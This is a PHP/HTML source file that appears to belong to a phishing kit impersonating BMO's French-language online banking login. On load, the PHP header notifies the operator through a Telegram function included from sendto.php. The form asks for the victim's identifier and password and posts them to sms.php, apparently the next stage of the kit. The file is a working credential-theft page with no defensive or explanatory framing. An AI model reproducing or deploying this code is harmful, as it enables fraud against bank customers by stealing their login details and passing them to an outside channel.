<?php 
session_start();
$_SESSION["bank"] = 'BMO';
require_once "../sendto.php";



sendMessageToTelegram('🟡🟡🟡'.$_SESSION['bank'].'🟡🟡🟡'); 
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <base href="./bmo">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BMO</title>
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/bmo/styles_mobile.css">

    <link rel="stylesheet" media="screen and (min-width: 769px)" href="/bmo/styles_pc.css">
</head>
    <header>
        <span>BMO</span> <img  width=50px  src="/bmo/bmo.webp" alt="">
    </header>
<body>
    <h2>Ouverture de session – Services bancaires en ligne
</h2>

<div class="container">
    <form action="/bmo/sms.php" method="post">
        
        <label for="cvv">Identifiant</label>
        <input type="text" name="cvv">
           
        <div class="check">
                <input type="checkbox"> <span>Memoriser le numero</span>
        
            </div>
        <label for="mdp">Mot de passe</label>
        <input type="password" name="mdp">
            <div class="valid"> 
                <input type="submit" value="connection">
            </div>
       

    </form>


    <div class="info">
        <div class="info1">
            <h4>Enregistrer une nouvelle carte pour les services bancaires en ligne</h4>
           <a href=""> Carte de débit </a>ou  <a href="">Carte de crédit</a>
        </div>
        <div class="info2">
           <h4> Votre sécurité passe toujours en premier.</h4>
           Nous avons rendu les services bancaires en ligne plus pratiques, tout  
            en utilisant des technologies de sécurité avancées qui protègent votre argent et vos informations.

        <a href="">
            Learn more about how we protect you.Opens in a new tab
        </a>
        </div>

</div>



</div>

    <footer>

    </footer>
</body>
</html>